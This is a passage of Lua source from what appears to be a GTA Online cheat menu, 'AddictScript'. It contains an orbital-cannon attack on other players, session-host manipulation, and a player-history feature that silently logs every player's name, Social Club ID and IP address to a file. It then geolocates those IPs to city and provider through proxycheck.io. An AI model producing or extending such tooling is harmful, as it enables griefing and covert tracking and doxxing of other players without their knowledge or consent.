				graphics.begin_scaleform_movie_method(orbital_cannon_cam, "SET_STATE")
				graphics.scaleform_movie_method_add_param_int(3)
				graphics.end_scaleform_movie_method()
				graphics.begin_scaleform_movie_method(orbital_cannon_cam, "SET_CHARGING_LEVEL")
				graphics.scaleform_movie_method_add_param_float(1.0)
				graphics.end_scaleform_movie_method()
				graphics.draw_scaleform_movie_fullscreen(orbital_cannon_cam, 255, 255, 255, 255, 0)
			end
			local direction = v3(0, 0, 0)
			local speed = 0.5
			if controls.is_disabled_control_pressed(0, 22) then
				speed = speed * 4
			end
			if controls.is_disabled_control_pressed(0, 32) then
				direction.y = speed
			end
			if controls.is_disabled_control_pressed(0, 35) then
				direction.x = speed
			end
			if controls.is_disabled_control_pressed(0, 34) then
				direction.x = -speed
			end
			if controls.is_disabled_control_pressed(0, 33) then
				direction.y = -speed
			end
			if direction ~= v3(0, 0, 0) then
				natives.SET_CAM_COORD(orbital_cannon_cam_cam, natives.GET_CAM_COORD(orbital_cannon_cam_cam) + direction)
			end
			local success, groundZ = gameplay.get_ground_z(natives.GET_CAM_COORD(orbital_cannon_cam_cam))
			if controls.is_disabled_control_pressed(0, 15) and not (success and (natives.GET_CAM_COORD(orbital_cannon_cam_cam).z - 6 - groundZ) < 25.0) then
				natives.SET_CAM_COORD(orbital_cannon_cam_cam, natives.GET_CAM_COORD(orbital_cannon_cam_cam) - v3(0, 0, 6))
			elseif controls.is_disabled_control_pressed(0, 14) then
				natives.SET_CAM_COORD(orbital_cannon_cam_cam, natives.GET_CAM_COORD(orbital_cannon_cam_cam) + v3(0, 0, 6))
			end
			if success and (natives.GET_CAM_COORD(orbital_cannon_cam_cam).z - groundZ) < 25.0 then
				natives.SET_CAM_COORD(orbital_cannon_cam_cam, v3(natives.GET_CAM_COORD(orbital_cannon_cam_cam).x, natives.GET_CAM_COORD(orbital_cannon_cam_cam).y, groundZ + 26))
			end
			if not natives.IS_PAUSE_MENU_ACTIVE() then
				if controls.is_disabled_control_just_pressed(0, 24) then
					local timer = utils.time_ms() + 3000
					while timer > utils.time_ms() and controls.is_disabled_control_pressed(0, 24) and not natives.IS_PAUSE_MENU_ACTIVE() do
						natives.STOP_AUDIO_SCENE("dlc_xm_orbital_cannon_camera_active_scene")
						for pid = 0, 31 do
							if player.is_player_valid(pid) then
								if interior.get_interior_from_entity(player.get_player_ped(pid)) == 0 and not natives.IS_ENTITY_GHOSTED_TO_LOCAL_PLAYER(player.get_player_ped(pid)) and not script_func.is_player_passive(pid) then
									natives.REQUEST_STREAMED_TEXTURE_DICT("helicopterhud", false)
									if natives.HAS_STREAMED_TEXTURE_DICT_LOADED("helicopterhud") then
										local sizeY = 0.013 * natives.GET_ASPECT_RATIO(false)
										local size = (((1 - (natives.GET_CAM_FOV(orbital_cannon_cam_cam) / 110.0)) * 1.0 + (natives.GET_CAM_FOV(orbital_cannon_cam_cam) / 110.0) * 0.5) * 0.03)
										natives.SET_DRAW_ORIGIN(player.get_player_coords(pid), 0)
										natives.DRAW_SPRITE("helicopterhud", "hud_corner", -size * 0.5, -size, 0.013, sizeY, 0.0, 190, 255, 190, 255, true, 0)
										natives.DRAW_SPRITE("helicopterhud", "hud_corner",  size * 0.5, -size, 0.013, sizeY, 90.0, 190, 255, 190, 255, true, 0)
										natives.DRAW_SPRITE("helicopterhud", "hud_corner", -size * 0.5,  size, 0.013, sizeY, 270., 190, 255, 190, 255, true, 0)
										natives.DRAW_SPRITE("helicopterhud", "hud_corner",  size * 0.5,  size, 0.013, sizeY, 180., 190, 255, 190, 255, true, 0)
										natives.CLEAR_DRAW_ORIGIN()
									end
								end
							end
						end
						ui.set_blip_coord(orbital_cannon_blip, natives.GET_CAM_COORD(orbital_cannon_cam_cam))
						for i = 6, 9 do
							ui.hide_hud_component_this_frame(i)
						end
						natives.DISABLE_ALL_CONTROL_ACTIONS(0)
						for i = 0, 6 do
							natives.ENABLE_CONTROL_ACTION(0, i, true)
						end
						for i = 199, 202 do
							natives.ENABLE_CONTROL_ACTION(0, i, true)
						end
						for i = 14, 15 do
							natives.ENABLE_CONTROL_ACTION(0, i, true)
						end
						natives.ENABLE_CONTROL_ACTION(0, 177, true)
						natives.ENABLE_CONTROL_ACTION(0, 237, true)
						natives.ENABLE_CONTROL_ACTION(0, 20, true)
						natives.ENABLE_CONTROL_ACTION(0, 246, true)
						natives.ENABLE_CONTROL_ACTION(0, 245, true)
						natives.CASCADE_SHADOWS_SET_AIRCRAFT_MODE(true)
						natives.SET_MINIMAP_IN_SPECTATOR_MODE(true, player.get_player_ped(player.player_id()))
						natives.REQUEST_ADDITIONAL_COLLISION_AT_COORD(player.get_player_coords(player.player_id()))
						natives.SET_FOCUS_POS_AND_VEL(natives.GET_CAM_COORD(orbital_cannon_cam_cam), 0.0, 0.0, 0.0)
						natives.LOCK_MINIMAP_POSITION(natives.GET_CAM_COORD(orbital_cannon_cam_cam).x, natives.GET_CAM_COORD(orbital_cannon_cam_cam).y)
						natives.NETWORK_SET_IN_FREE_CAM_MODE(true)
						local orbital_cannon_cam = graphics.request_scaleform_movie("ORBITAL_CANNON_CAM")
						if graphics.has_scaleform_movie_loaded(orbital_cannon_cam) then
							graphics.begin_scaleform_movie_method(orbital_cannon_cam, "SET_ZOOM_LEVEL")
							graphics.scaleform_movie_method_add_param_float(0.0)
							graphics.end_scaleform_movie_method()
							graphics.begin_scaleform_movie_method(orbital_cannon_cam, "SET_STATE")
							graphics.scaleform_movie_method_add_param_int(3)
							graphics.end_scaleform_movie_method()
							if timer - utils.time_ms() <= 1000 then
								graphics.begin_scaleform_movie_method(orbital_cannon_cam, "SET_COUNTDOWN")
								graphics.scaleform_movie_method_add_param_int(1)
								graphics.end_scaleform_movie_method()
							elseif timer - utils.time_ms() <= 2000 then
								graphics.begin_scaleform_movie_method(orbital_cannon_cam, "SET_COUNTDOWN")
								graphics.scaleform_movie_method_add_param_int(2)
								graphics.end_scaleform_movie_method()
							elseif timer - utils.time_ms() <= 3000 then
								graphics.begin_scaleform_movie_method(orbital_cannon_cam, "SET_COUNTDOWN")
								graphics.scaleform_movie_method_add_param_int(3)
								graphics.end_scaleform_movie_method()
							end
							graphics.draw_scaleform_movie_fullscreen(orbital_cannon_cam, 255, 255, 255, 255, 0)
						end
						local direction = v3(0, 0, 0)
						local speed = 0.5
						if controls.is_disabled_control_pressed(0, 22) then
							speed = speed * 4
						end
						if controls.is_disabled_control_pressed(0, 32) then
							direction.y = speed
						end
						if controls.is_disabled_control_pressed(0, 35) then
							direction.x = speed
						end
						if controls.is_disabled_control_pressed(0, 34) then
							direction.x = -speed
						end
						if controls.is_disabled_control_pressed(0, 33) then
							direction.y = -speed
						end
						if direction ~= v3(0, 0, 0) then
							natives.SET_CAM_COORD(orbital_cannon_cam_cam, natives.GET_CAM_COORD(orbital_cannon_cam_cam) + direction)
						end
						local success, groundZ = gameplay.get_ground_z(natives.GET_CAM_COORD(orbital_cannon_cam_cam))
						if controls.is_disabled_control_pressed(0, 15) and not (success and (natives.GET_CAM_COORD(orbital_cannon_cam_cam).z - 6 - groundZ) < 25.0) then
							natives.SET_CAM_COORD(orbital_cannon_cam_cam, natives.GET_CAM_COORD(orbital_cannon_cam_cam) - v3(0, 0, 6))
						elseif controls.is_disabled_control_pressed(0, 14) then
							natives.SET_CAM_COORD(orbital_cannon_cam_cam, natives.GET_CAM_COORD(orbital_cannon_cam_cam) + v3(0, 0, 6))
						end
						if success and (natives.GET_CAM_COORD(orbital_cannon_cam_cam).z - groundZ) < 25.0 then
							natives.SET_CAM_COORD(orbital_cannon_cam_cam, v3(natives.GET_CAM_COORD(orbital_cannon_cam_cam).x, natives.GET_CAM_COORD(orbital_cannon_cam_cam).y, groundZ + 26))
						end
						system.yield(0)
					end
					if timer <= utils.time_ms() then
						entity_func.create_orbital_cannon_explosion(select(2, worldprobe.raycast(natives.GET_CAM_COORD(orbital_cannon_cam_cam), v3(natives.GET_CAM_COORD(orbital_cannon_cam_cam).x, natives.GET_CAM_COORD(orbital_cannon_cam_cam).y, -50), -1, 0)) + v3(0, 0, 1), true)
						natives.SHAKE_CAM(orbital_cannon_cam_cam, "GAMEPLAY_EXPLOSION_SHAKE", 1.5)
						local timer = utils.time_ms() + 3000
						while timer > utils.time_ms() do
							natives.STOP_AUDIO_SCENE("dlc_xm_orbital_cannon_camera_active_scene")
							for pid = 0, 31 do
								if player.is_player_valid(pid) then
									if interior.get_interior_from_entity(player.get_player_ped(pid)) == 0 and not natives.IS_ENTITY_GHOSTED_TO_LOCAL_PLAYER(player.get_player_ped(pid)) and not script_func.is_player_passive(pid) then
										natives.REQUEST_STREAMED_TEXTURE_DICT("helicopterhud", false)
										if natives.HAS_STREAMED_TEXTURE_DICT_LOADED("helicopterhud") then
											local sizeY = 0.013 * natives.GET_ASPECT_RATIO(false)
											local size = (((1 - (natives.GET_CAM_FOV(orbital_cannon_cam_cam) / 110.0)) * 1.0 + (natives.GET_CAM_FOV(orbital_cannon_cam_cam) / 110.0) * 0.5) * 0.03)
											natives.SET_DRAW_ORIGIN(player.get_player_coords(pid), 0)
											natives.DRAW_SPRITE("helicopterhud", "hud_corner", -size * 0.5, -size, 0.013, sizeY, 0.0, 190, 255, 190, 255, true, 0)
											natives.DRAW_SPRITE("helicopterhud", "hud_corner",  size * 0.5, -size, 0.013, sizeY, 90.0, 190, 255, 190, 255, true, 0)
											natives.DRAW_SPRITE("helicopterhud", "hud_corner", -size * 0.5,  size, 0.013, sizeY, 270., 190, 255, 190, 255, true, 0)
											natives.DRAW_SPRITE("helicopterhud", "hud_corner",  size * 0.5,  size, 0.013, sizeY, 180., 190, 255, 190, 255, true, 0)
											natives.CLEAR_DRAW_ORIGIN()
										end
									end
								end
							end
							ui.set_blip_coord(orbital_cannon_blip, natives.GET_CAM_COORD(orbital_cannon_cam_cam))
							for i = 6, 9 do
								ui.hide_hud_component_this_frame(i)
							end
							natives.DISABLE_ALL_CONTROL_ACTIONS(0)
							for i = 0, 6 do
								natives.ENABLE_CONTROL_ACTION(0, i, true)
							end
							for i = 199, 202 do
								natives.ENABLE_CONTROL_ACTION(0, i, true)
							end
							for i = 14, 15 do
								natives.ENABLE_CONTROL_ACTION(0, i, true)
							end
							natives.ENABLE_CONTROL_ACTION(0, 177, true)
							natives.ENABLE_CONTROL_ACTION(0, 237, true)
							natives.ENABLE_CONTROL_ACTION(0, 20, true)
							natives.ENABLE_CONTROL_ACTION(0, 246, true)
							natives.ENABLE_CONTROL_ACTION(0, 245, true)
							natives.CASCADE_SHADOWS_SET_AIRCRAFT_MODE(true)
							natives.SET_MINIMAP_IN_SPECTATOR_MODE(true, player.get_player_ped(player.player_id()))
							natives.REQUEST_ADDITIONAL_COLLISION_AT_COORD(player.get_player_coords(player.player_id()))
							natives.SET_FOCUS_POS_AND_VEL(natives.GET_CAM_COORD(orbital_cannon_cam_cam), 0.0, 0.0, 0.0)
							natives.LOCK_MINIMAP_POSITION(natives.GET_CAM_COORD(orbital_cannon_cam_cam).x, natives.GET_CAM_COORD(orbital_cannon_cam_cam).y)
							natives.NETWORK_SET_IN_FREE_CAM_MODE(true)
							local orbital_cannon_cam = graphics.request_scaleform_movie("ORBITAL_CANNON_CAM")
							if graphics.has_scaleform_movie_loaded(orbital_cannon_cam) then
								graphics.begin_scaleform_movie_method(orbital_cannon_cam, "SET_ZOOM_LEVEL")
								graphics.scaleform_movie_method_add_param_float(0.0)
								graphics.end_scaleform_movie_method()
								graphics.begin_scaleform_movie_method(orbital_cannon_cam, "SET_STATE")
								graphics.scaleform_movie_method_add_param_int(3)
								graphics.end_scaleform_movie_method()
								graphics.begin_scaleform_movie_method(orbital_cannon_cam, "SET_CHARGING_LEVEL")
								graphics.scaleform_movie_method_add_param_float(tonumber(1.0 - ((timer - utils.time_ms()) / 3000)))
								graphics.end_scaleform_movie_method()
								graphics.draw_scaleform_movie_fullscreen(orbital_cannon_cam, 255, 255, 255, 255, 0)
							end
							local direction = v3(0, 0, 0)
							local speed = 0.5
							if controls.is_disabled_control_pressed(0, 22) then
								speed = speed * 4
							end
							if controls.is_disabled_control_pressed(0, 32) then
								direction.y = speed
							end
							if controls.is_disabled_control_pressed(0, 35) then
								direction.x = speed
							end
							if controls.is_disabled_control_pressed(0, 34) then
								direction.x = -speed
							end
							if controls.is_disabled_control_pressed(0, 33) then
								direction.y = -speed
							end
							if direction ~= v3(0, 0, 0) then
								natives.SET_CAM_COORD(orbital_cannon_cam_cam, natives.GET_CAM_COORD(orbital_cannon_cam_cam) + direction)
							end
							local success, groundZ = gameplay.get_ground_z(natives.GET_CAM_COORD(orbital_cannon_cam_cam))
							if controls.is_disabled_control_pressed(0, 15) and not (success and (natives.GET_CAM_COORD(orbital_cannon_cam_cam).z - 6 - groundZ) < 25.0) then
								natives.SET_CAM_COORD(orbital_cannon_cam_cam, natives.GET_CAM_COORD(orbital_cannon_cam_cam) - v3(0, 0, 6))
							elseif controls.is_disabled_control_pressed(0, 14) then
								natives.SET_CAM_COORD(orbital_cannon_cam_cam, natives.GET_CAM_COORD(orbital_cannon_cam_cam) + v3(0, 0, 6))
							end
							if success and (natives.GET_CAM_COORD(orbital_cannon_cam_cam).z - groundZ) < 25.0 then
								natives.SET_CAM_COORD(orbital_cannon_cam_cam, v3(natives.GET_CAM_COORD(orbital_cannon_cam_cam).x, natives.GET_CAM_COORD(orbital_cannon_cam_cam).y, groundZ + 26))
							end
							system.yield(0)
						end
					end
					natives.START_AUDIO_SCENE("dlc_xm_orbital_cannon_camera_active_scene")
				end
			end
			system.yield(0)
		end
		natives.DO_SCREEN_FADE_OUT(500)
		system.yield(500)
		if orbital_cannon_cam_cam then
			natives.SET_CAM_ACTIVE(orbital_cannon_cam_cam, false)
			natives.RENDER_SCRIPT_CAMS(false, false, 0, false, false, false)
			natives.DESTROY_CAM(orbital_cannon_cam_cam, false)
		end
		if orbital_cannon_blip then
			ui.remove_blip(orbital_cannon_blip)
		end
		natives.CASCADE_SHADOWS_SET_AIRCRAFT_MODE(false)
		natives.SET_MINIMAP_IN_SPECTATOR_MODE(false, player.get_player_ped(player.player_id()))
		natives.STOP_AUDIO_SCENE("dlc_xm_orbital_cannon_camera_active_scene")
		natives.NETWORK_SET_IN_FREE_CAM_MODE(false)
		natives.UNLOCK_MINIMAP_POSITION()
		natives.ENABLE_ALL_CONTROL_ACTIONS(0)
		natives.CLEAR_FOCUS()
		natives.DO_SCREEN_FADE_IN(500)
		system.yield(500)
		script.set_global_i(2689235 + 1 + (player.player_id() * 453) + 416, script.get_global_i(2689235 + 1 + (player.player_id() * 453) + 416) & ~1 << 0)
	else
		f.on = false
	end
end)

feature["BST Loop"] = menu.add_feature("BST Loop", "toggle", localparents["Services"].id, function(f)
	local BST = menu.get_feature_by_hierarchy_key("online.services.bull_shark_testosterone")
	while f.on do
		system.yield(0)
		if network.is_session_started() and not entity.is_entity_dead(player.get_player_ped(player.player_id())) then
			BST:toggle()
		end
	end
end)

feature["Joining/Leaving Players"] = menu.add_feature("Joining/Leaving Players", "value_str", localparents["Lobby"].id, function(f)
	if f.on then
		listeners["Joining Players"] = event.add_event_listener("player_join", function(player_join)
			if f.value < 2 then
				menu.notify(tostring(player.get_player_scid(player_join.player)) .. "/" .. tostring(utilities.dec_to_ipv4(player.get_player_ip(player_join.player))), tostring(player.get_player_name(player_join.player)) .. " Joined", 8, NotifyColours["blue"])
			end
			if f.value == 0 or f.value == 2 then
				if player_join.player ~= player.player_id() then
					if utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "Players.txt")) then
						if player.get_player_name(player_join.player) ~= nil and player.get_player_scid(player_join.player) ~= -1 and player.get_player_scid(player_join.player) ~= 0 then
							if not string.find(player.get_player_name(player_join.player), "|") then
								text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "Players.txt"), "a"), text_func.generate_random_id() .. "|" .. tostring(player.get_player_name(player_join.player)) .. "|" .. tostring(player.get_player_scid(player_join.player)) .. "|" .. tostring(player.get_player_ip(player_join.player)) .. "|" .. tostring(os.date("*t").year) .. "|" .. tostring(os.date("*t").month) .. "|" .. tostring(os.date("*t").day) .. "|" .. tostring(os.date("*t").hour) .. "|" .. tostring(os.date("*t").min) .. "|" .. tostring(os.date("*t").sec) .. "|1\n")
							end
						end
					end
				end
			end
		end)
		listeners["Leaving Players"] = event.add_event_listener("player_leave", function(player_leave)
			if f.value < 2 then
				if MiscAccountInfo.PacketLoss[player_leave.player] ~= nil and MiscAccountInfo.Latency[player_leave.player] ~= nil then
					if MiscAccountInfo.PacketLoss[player_leave.player] >= 0.75 and MiscAccountInfo.Latency[player_leave.player] >= 1000 then
						menu.notify(tostring(MiscAccountInfo.SCID[player_leave.player]) .. "/" .. tostring(utilities.dec_to_ipv4(MiscAccountInfo.IP[player_leave.player])), tostring(MiscAccountInfo.Name[player_leave.player]) .. " Crashed After Freemode Death", 8, NotifyColours["blue"])
					elseif MiscAccountInfo.PacketLoss[player_leave.player] >= 0.75 then
						menu.notify(tostring(MiscAccountInfo.SCID[player_leave.player]) .. "/" .. tostring(utilities.dec_to_ipv4(MiscAccountInfo.IP[player_leave.player])), tostring(MiscAccountInfo.Name[player_leave.player]) .. " Timed Out", 8, NotifyColours["blue"])
					elseif MiscAccountInfo.Latency[player_leave.player] >= 1000 then
						menu.notify(tostring(MiscAccountInfo.SCID[player_leave.player]) .. "/" .. tostring(utilities.dec_to_ipv4(MiscAccountInfo.IP[player_leave.player])), tostring(MiscAccountInfo.Name[player_leave.player]) .. " Left Due To Freemode Death", 8, NotifyColours["blue"])
					else
						menu.notify(tostring(MiscAccountInfo.SCID[player_leave.player]) .. "/" .. tostring(utilities.dec_to_ipv4(MiscAccountInfo.IP[player_leave.player])), tostring(MiscAccountInfo.Name[player_leave.player]) .. " Left", 8, NotifyColours["blue"])
					end
				else
					menu.notify(tostring(MiscAccountInfo.SCID[player_leave.player]) .. "/" .. tostring(utilities.dec_to_ipv4(MiscAccountInfo.IP[player_leave.player])), tostring(MiscAccountInfo.Name[player_leave.player]) .. " Left", 8, NotifyColours["blue"])
				end
			end
			if f.value == 0 or f.value == 2 then
				if player_leave.player ~= player.player_id() then
					if utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "Players.txt")) then
						if MiscAccountInfo.Name[player_leave.player] ~= nil and MiscAccountInfo.SCID[player_leave.player] ~= -1 and MiscAccountInfo.SCID[player_leave.player] ~= 0 then
							if not string.find(MiscAccountInfo.Name[player_leave.player], "|") then
								text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "Players.txt"), "a"), text_func.generate_random_id() .. "|" .. tostring(MiscAccountInfo.Name[player_leave.player]) .. "|" .. tostring(MiscAccountInfo.SCID[player_leave.player]) .. "|" .. tostring(MiscAccountInfo.IP[player_leave.player]) .. "|" .. tostring(os.date("*t").year) .. "|" .. tostring(os.date("*t").month) .. "|" .. tostring(os.date("*t").day) .. "|" .. tostring(os.date("*t").hour) .. "|" .. tostring(os.date("*t").min) .. "|" .. tostring(os.date("*t").sec) .. "|2\n")
							end
						end
					end
				end
			end
		end)
	end
	while f.on do
		system.yield(0)
		for pid = 0, 31 do
			if player.is_player_valid(pid) then
				MiscAccountInfo.PacketLoss[pid] = natives.NETWORK_GET_AVERAGE_PACKET_LOSS_FOR_PLAYER(pid)
				MiscAccountInfo.Latency[pid] = natives.NETWORK_GET_AVERAGE_LATENCY_FOR_PLAYER_2(pid)
				MiscAccountInfo.Name[pid] = player.get_player_name(pid)
				MiscAccountInfo.SCID[pid] = player.get_player_scid(pid)
				MiscAccountInfo.IP[pid] = math.tointeger(player.get_player_ip(pid))
			else
				system.yield(100)
				MiscAccountInfo.PacketLoss[pid] = 0
				MiscAccountInfo.Latency[pid] = 0
				MiscAccountInfo.Name[pid] = 0
				MiscAccountInfo.SCID[pid] = 0
				MiscAccountInfo.IP[pid] = 0
			end
		end
	end
	if not f.on then
		if listeners["Joining Players"] then
			event.remove_event_listener("player_join", listeners["Joining Players"])
			listeners["Joining Players"] = nil
		end
		if listeners["Leaving Players"] then
			event.remove_event_listener("player_leave", listeners["Leaving Players"])
			listeners["Leaving Players"] = nil
		end
	end
end)
feature["Joining/Leaving Players"]:set_str_data({"Log & Notify", "Notify", "Log"})

local PlayerHistoryFeatures = {}
local PlayerHistorySearchFeatures = {}

localparents["Player History"] = menu.add_feature("Player History", "parent", localparents["Lobby"].id)

localparents["Player History Search"] = menu.add_feature("Search", "parent", localparents["Player History"].id)

local player_history_last_input = ""

feature["Search: "] = menu.add_feature("Search: " .. player_history_last_input, "action", localparents["Player History Search"].id, function(f)
	local input_stat, input_val = input.get("", player_history_last_input, 24, 0)
	if input_stat == 1 then
		return HANDLER_CONTINUE
	end
	if input_stat == 2 then
		return HANDLER_POP
	end
	if input_val ~= nil and input_val ~= "" then
		f.name = "Search: " .. input_val
		player_history_last_input = input_val
		for i = 1, #PlayerHistorySearchFeatures do
			if PlayerHistorySearchFeatures[i] then
				menu.delete_feature(PlayerHistorySearchFeatures[i].id)
			end
		end
		PlayerHistorySearchFeatures = {}
		local file = io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "Players.txt"), "r")
		for line in file:lines() do
			if string.find(line, "|") then
				local parts = text_func.split_string(line, "|")
				if string.find(parts[2]:lower(), input_val:lower()) then
					local typestring = " - Joined"
					if parts[11] == "2" then
						typestring = " - Left"
					end
					local playerhandle = natives.NETWORK_HANDLE_FROM_USER_ID(tostring(parts[3]), 13)
					local flags = ""
					if natives.NETWORK_CAN_PLAY_MULTIPLAYER_WITH_GAMER(playerhandle) or natives.NETWORK_CAN_GAMER_PLAY_MULTIPLAYER_WITH_ME(playerhandle) or natives._0x021ABCBD98EC4320(playerhandle) or natives._0x421E34C55F125964(playerhandle) or natives.NETWORK_IS_FRIEND_HANDLE_ONLINE(playerhandle) then
						flags = "[O] "
					end
					if natives.NETWORK_IS_FRIEND(playerhandle) then
						if flags ~= "" then
							flags = flags .. "[F] "
						else
							flags = "[F] "
						end
					end
					PlayerHistorySearchFeatures[#PlayerHistorySearchFeatures + 1] = menu.add_feature(parts[2] .. typestring .. " " .. flags, "action_value_str", localparents["Player History Search"].id, function(f)
						if PlayerHistoryFeatures[parts[1]] then
							if PlayerHistoryFeatures[parts[1]].parent then
								PlayerHistoryFeatures[parts[1]].parent:toggle()
							end
							PlayerHistoryFeatures[parts[1]]:select()
						end
					end)
					PlayerHistorySearchFeatures[#PlayerHistorySearchFeatures]:set_str_data({"Jump To"})
				end
			end
		end
	end
end)

localparents["Player History All Players"] = menu.add_feature("All Players", "parent", localparents["Player History"].id)

do
	if utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "Players.txt")) then
		local file = io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "Players.txt"), "r")
		for line in file:lines() do
			if string.find(line, "|") then
				local parts = text_func.split_string(line, "|")
				if not localparents["Player History " .. parts[5]] then
					localparents["Player History " .. parts[5]] = menu.add_feature(parts[5], "parent", localparents["Player History All Players"].id)
				end
				local month_strings = {
					["1"] = "January",
					["2"] = "February",
					["3"] = "March",
					["4"] = "April",
					["5"] = "May",
					["6"] = "June",
					["7"] = "July",
					["8"] = "August",
					["9"] = "September",
					["10"] = "October",
					["11"] = "November",
					["12"] = "December",
				}
				if not localparents["Player History " .. parts[5] .. "." .. parts[6]] then
					localparents["Player History " .. parts[5] .. "." .. parts[6]] = menu.add_feature(month_strings[parts[6]], "parent", localparents["Player History " .. parts[5]].id)
				end
				if not localparents["Player History " .. parts[5] .. "." .. parts[6] .. "." .. parts[7]] then
					localparents["Player History " .. parts[5] .. "." .. parts[6] .. "." .. parts[7]] = menu.add_feature(parts[7] .. ".", "parent", localparents["Player History " .. parts[5] .. "." .. parts[6]].id)
				end
				if not localparents["Player History " .. parts[5] .. "." .. parts[6] .. "." .. parts[7] .. "." .. parts[8]] then
					localparents["Player History " .. parts[5] .. "." .. parts[6] .. "." .. parts[7] .. "." .. parts[8]] = menu.add_feature(parts[8] .. ":00-" .. math.tointeger(parts[8]) + 1 .. ":00", "parent", localparents["Player History " .. parts[5] .. "." .. parts[6] .. "." .. parts[7]].id)
				end
				local typestring = " - Joined"
				if parts[11] == "2" then
					typestring = " - Left"
				end
				local playerhandle = natives.NETWORK_HANDLE_FROM_USER_ID(tostring(parts[3]), 13)
				local flags = ""
				if natives.NETWORK_CAN_PLAY_MULTIPLAYER_WITH_GAMER(playerhandle) or natives.NETWORK_CAN_GAMER_PLAY_MULTIPLAYER_WITH_ME(playerhandle) or natives._0x021ABCBD98EC4320(playerhandle) or natives._0x421E34C55F125964(playerhandle) or natives.NETWORK_IS_FRIEND_HANDLE_ONLINE(playerhandle) then
					flags = "[O] "
				end
				if natives.NETWORK_IS_FRIEND(playerhandle) then
					if flags ~= "" then
						flags = flags .. "[F] "
					else
						flags = "[F] "
					end
				end
				PlayerHistoryFeatures[parts[1]] = menu.add_feature(parts[2] .. typestring .. " " .. flags, "action_value_str", localparents["Player History " .. parts[5] .. "." .. parts[6] .. "." .. parts[7] .. "." .. parts[8]].id, function(f)
					if f.value == 0 then
						menu.notify("Name: " .. tostring(parts[2]) .. "\nSCID: " .. tostring(parts[3]) .. "\nIP: " .. utilities.dec_to_ipv4(math.tointeger(parts[4])) .. "\nLogged On: " .. parts[5] .. "." .. parts[6] .. "." .. parts[7] .. " " .. parts[8] .. ":" .. parts[9] .. ":" .. parts[10] .. "\nFriend: " .. tostring(natives.NETWORK_IS_FRIEND(playerhandle)) .. "\nOnline: " ..  tostring(natives.NETWORK_CAN_PLAY_MULTIPLAYER_WITH_GAMER(playerhandle) or natives.NETWORK_CAN_GAMER_PLAY_MULTIPLAYER_WITH_ME(playerhandle) or natives._0x021ABCBD98EC4320(playerhandle) or natives._0x421E34C55F125964(playerhandle) or natives.NETWORK_IS_FRIEND_HANDLE_ONLINE(playerhandle)), "AddictScript Player History", 12, NotifyColours["green"])
					elseif f.value == 1 then
						local success, webdata = web.get("https://proxycheck.io/v2/" .. utilities.dec_to_ipv4(math.tointeger(parts[4])) .. "?vpn=1&asn=1")
						if string.find(webdata, "ok") then
							local ip_real = utilities.dec_to_ipv4(math.tointeger(parts[4]))
							local provider_real = webdata:match("\"provider\":%s*\"([^\"]+)\",")
							local continent_real = webdata:match("\"continent\":%s*\"([^\"]+)\",")
							local country_real = webdata:match("\"country\":%s*\"([^\"]+)\",")
							local region_real = webdata:match("\"region\":%s*\"([^\"]+)\",")
							local city_real = webdata:match("\"city\":%s*\"([^\"]+)\",")
							local proxy_real = webdata:match("\"proxy\":%s*\"([^\"]+)\",")
							local type_real = webdata:match("\"type\":%s*\"([^\"]+)\"")
							menu.notify("IP: " .. tostring(ip_real) .. "\nProvider: " .. tostring(provider_real) .. "\nContinent: " .. tostring(continent_real) .. "\nCountry: " .. tostring(country_real) .. "\nRegion: " .. tostring(region_real) .. "\nCity: " .. tostring(city_real) .. "\nProxy: " .. tostring(proxy_real) .. "\nType: " .. tostring(type_real), "Player IP Info", 24, NotifyColours["green"])
						elseif string.find(webdata, "error") then
							menu.notify("Invalid IP Address!\n" .. utilities.dec_to_ipv4(ip), "Player IP Info", 12, NotifyColours["green"])
						elseif string.find(webdata, "denied") then
							menu.notify("Nooo you reached the max api requests for today :(((((((((((((", AddictScript, 4, NotifyColours["red"])
						end
					elseif f.value == 2 then
						natives.NETWORK_SHOW_PROFILE_UI(playerhandle)
					else
						if PlayerHistoryFeatures[parts[1]] then
							menu.delete_feature(PlayerHistoryFeatures[parts[1]].id)
						end
						if utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "Players.txt")) then
							local finalstring = ""
							local file2 = io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "Players.txt"), "r")
							for line2 in file2:lines() do
								if not string.find(line2, parts[1]) then
									finalstring = finalstring .. line2.. "\n"
								end
							end
							text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "Players.txt"), "w"), "")
							if finalstring ~= "" then
								text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "Players.txt"), "a"), finalstring)
							end
						end
					end

				end)
				PlayerHistoryFeatures[parts[1]]:set_str_data({"Show Info", "IP Info", "View SC Profile", "Remove"})
			end
		end
	end
end

localparents["Host Options"] = menu.add_feature("Host Options", "parent", localparents["Lobby"].id)

feature["Block Join Requests"] = menu.add_feature("Block Join Requests", "toggle", localparents["Host Options"].id, function(f)
	if f.on then
		while f.on do
			if network.is_session_started() and network.network_is_host() then
				natives.NETWORK_SESSION_BLOCK_JOIN_REQUESTS(true)
			end
			system.yield(6000)
		end
	end
	if not f.on then
		if network.is_session_started() and network.network_is_host() then
			natives.NETWORK_SESSION_BLOCK_JOIN_REQUESTS(false)
		end
	end
end)

feature["Hide Session"] = menu.add_feature("Hide Session", "toggle", localparents["Host Options"].id, function(f)
	if f.on then
		while f.on do
			if network.is_session_started() and network.network_is_host() then
				if natives.NETWORK_SESSION_IS_VISIBLE() then
					natives.NETWORK_SESSION_MARK_VISIBLE(false)
				end
			end
			system.yield(6000)
		end
	end
	if not f.on then
		if network.is_session_started() and network.network_is_host() then
			if not natives.NETWORK_SESSION_IS_VISIBLE() then
				natives.NETWORK_SESSION_MARK_VISIBLE(true)
			end
		end
	end
end)

feature["Block SH Migration"] = menu.add_feature("Block SH Migration", "toggle", localparents["Host Options"].id, function(f)
	while f.on do
		if network.is_session_started() and network.network_is_host() then
			natives.NETWORK_PREVENT_SCRIPT_HOST_MIGRATION()
		end
		system.yield(0)
	end
end)

feature["Auto Force Session Host"] = menu.add_feature("Auto Force Session Host", "toggle", localparents["Lobby"].id, function(f)
	if f.on then
